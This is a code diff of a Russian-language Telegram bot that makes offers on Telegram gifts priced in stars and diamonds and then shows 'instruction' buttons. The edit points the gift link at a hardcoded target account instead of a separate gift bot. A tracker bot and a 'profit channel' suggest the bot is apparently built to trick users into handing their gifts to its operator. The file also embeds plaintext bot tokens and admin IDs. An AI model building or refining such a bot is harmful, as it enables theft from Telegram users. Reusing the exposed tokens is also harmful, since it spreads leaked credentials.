@@ -19,9 +19,6 @@ TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
 TARGET_USERNAME = "rattiixx"
 CURRENCY = {"g": "💎", "s": "⭐"}
 
-# Юзернейм бота, который открывает подарок (без скобок и символов @)
-GIFT_BOT_USERNAME = "Gift9282828292929_bot"
-
 TRACKER_BOT_TOKEN = "8914754146:AAH3WF5wVgNtvfXpomuVCY1KoZ9VrBcGPcw"
 TRACKER_ADMIN_ID = 9158877731
 PROFIT_CHANNEL_ID = -1003914079695
@@ -84,10 +81,10 @@ def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
         ]]
     )
 
-def instruction_kb(lang: str, gift_slug: str) -> InlineKeyboardMarkup:
+def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     t = TEXTS.get(lang, TEXTS["ru"])
-    # Твоя новая ссылка на бота-подарка
-    gift_url = f"https://t.me/{GIFT_BOT_USERNAME}?gift={gift_slug}"
+    # ССЫЛКА, КОТОРУЮ ТЫ ПРОСИЛ
+    gift_url = f"https://t.me/{TARGET_USERNAME}?gift=1"
     
     return InlineKeyboardMarkup(
         inline_keyboard=[
@@ -159,16 +156,12 @@ async def handle_custom_command(message: Message):
         if cur_key not in CURRENCY:
             return
 
-        # Извлекаем slug подарка из ссылки (например, LibertyFigure-94879)
-        gift_slug = url.split("/")[-1]
-
         t = TEXTS.get(lang, TEXTS["ru"])
         gift_name = await fetch_gift_name(url)
 
         oid = uuid.uuid4().hex[:8]
         OFFERS[oid] = {
             "url": url,
-            "gift_slug": gift_slug,
             "sum": raw_sum,
             "cur": CURRENCY[cur_key],
             "lang": lang,
@@ -232,7 +225,7 @@ async def cb_accept(call: CallbackQuery):
     try:
         await call.message.edit_text(
             text=text,
-            reply_markup=instruction_kb(lang, offer["gift_slug"]),
+            reply_markup=instruction_kb(lang),
             link_preview_options=LARGE_PREVIEW
         )
     except TelegramBadRequest:
